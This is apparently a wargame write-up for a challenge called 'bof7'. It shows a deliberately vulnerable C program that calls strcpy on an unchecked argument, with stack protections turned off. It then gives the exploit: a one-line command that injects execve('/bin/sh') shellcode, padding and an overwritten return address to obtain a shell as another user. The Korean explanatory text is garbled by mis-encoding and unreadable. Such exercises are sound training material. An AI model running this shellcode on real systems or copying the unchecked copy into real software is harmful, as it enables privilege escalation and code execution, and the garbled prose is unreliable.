# bof7 ����

## bof7.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define BUF_SIZE 128
#define R "\033[31m"
#define E "\033[0m"

// ASLR OFF
// STACK-PROTECTOR OFF
// STACK-EXECUTION ON

void vuln(char * arg){
    char buf[BUF_SIZE];

    if (setreuid(1007, 1007)) {
        perror("setuid");
        exit(1);
    }
    if (setregid(1007, 1007)) {
        perror("setgid");
        exit(1);
    }

    strcpy(buf, arg);
    printf("Hello %s[%p]!\n", buf, buf);
}

int main(int c, char *v[]) {
    if (c < 2) {
        fputs(R "error :( this program needs some arguments\n" E, stderr);
        return 1;
    }
    vuln(v[1]);
    return 0;
}
```

�� �ڵ带 ���� `strcpy` �Լ��� ����ϴ� �ش� �Լ��� �����ؾ��ϴ� ���� �� �� �ִ�.

<br>

---

## ���� ���

`buf` ������ Shell Code�� Dummy ���� �־� Return Address ������ ä���, Return Address���� `buf`�� �ּҸ� �Է��Ѵ�. ������ Ret-sled ���� ����� ����Ѵ�.

  
| `buf` | `SFP` | `RET` | �� ����Ʈ |
| :--: | :--: | :--: | :--: |
|ShellCode+Dummy | Dummy |buf Address | 27+109+8 = 144
<br>
---

## ���

![bof7_1](img/bof7_1.png)

`./bof7`�� ������ ���� ���� ���̿� ���� `buf`�� �ּҰ� �޶����� ���� �� �� �ִ�.

<br>

![bof7_2](img/bof7_2.png)

�츮�� `buf`�� �־�� �� �����Ǹ� �˰� �ִ�. �� ���� �־��� �� `buf` �ּҸ� Ȯ���Ѵ�.

<br>

![bof7_3](img/bof7_3.png)

���̷ε忡 ���� ��ɾ �ۼ��ϸ� ������ ���� �ȴ�.
```shell
$ ./bof7 `python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" + "a"*109 + "\xb0\xea\xff\xff\xff\x7f"'`
```

�� ��ɾ �����ϸ� �� ������ ���� Shell�� ���� �� ������ Ȯ���� �� �ִ�.
